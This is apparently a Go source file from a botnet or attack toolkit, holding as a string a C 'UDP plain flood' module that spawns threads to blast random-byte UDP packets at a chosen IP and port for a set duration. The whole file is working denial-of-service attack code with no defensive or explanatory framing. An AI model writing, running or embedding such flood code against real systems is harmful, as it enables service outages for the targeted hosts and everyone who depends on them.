package payloads

var UDPPlain = `
// ==================== UDP PLAIN FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>

static int udp_plain_running = 0;
static pthread_t udp_plain_threads[100];

void *udp_plain_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int duration = *(int *)((char *)arg + 68);
    int length = *(int *)((char *)arg + 72);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return NULL;
    
    char *payload = malloc(length);
    time_t start = time(NULL);
    
    while (udp_plain_running && time(NULL) - start < duration) {
        for (int i = 0; i < length; i++) payload[i] = rand() % 256;
        sendto(s, payload, length, 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    
    free(payload);
    close(s);
    return NULL;
}

void start_udp_plain_attack(char *target, int port, int threads, int duration_sec, int length) {
    if (udp_plain_running) return;
    udp_plain_running = 1;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = duration_sec;
    *((int *)(arg + 72)) = length;
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&udp_plain_threads[i], NULL, udp_plain_flood, arg);
    }
    
    sleep(duration_sec);
    udp_plain_running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(udp_plain_threads[i], NULL);
    }
    free(arg);
}

void stop_udp_plain_attack() { udp_plain_running = 0; }
// ==================== END UDP PLAIN MODULE ====================
`